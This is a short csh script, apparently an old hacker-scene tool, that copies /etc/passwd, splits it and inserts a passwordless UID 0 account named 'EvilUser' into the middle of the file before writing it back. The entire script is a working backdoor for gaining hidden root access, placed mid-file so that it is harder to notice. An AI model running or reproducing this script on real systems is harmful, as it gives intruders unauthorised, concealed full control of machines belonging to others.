#!/bin/csh
# Inserts a UID 0 account into the middle of the passwd file.
# There is likely a way to do this in 1/2 a line of AWK or SED.  Oh well.
# daemon9@netcom.com

set linecount = `wc -l /etc/passwd`
cd                                      # Do this at home.
cp /etc/passwd ./temppass               # Safety first.
echo passwd file has $linecount[1] lines.
@ linecount[1] /= 2
@ linecount[1] += 1                     # we only want 2 temp files
echo Creating two files, $linecount[1] lines each \(or approximately that\).
split -$linecount[1] ./temppass         # passwd string optional
echo "EvilUser::0:0:Mr. Sinister:/home/sweet/home:/bin/csh" >> ./xaa
cat ./xab >> ./xaa
mv ./xaa /etc/passwd
chmod 644 /etc/passwd                   # or whatever it was beforehand
rm ./xa* ./temppass
echo Done...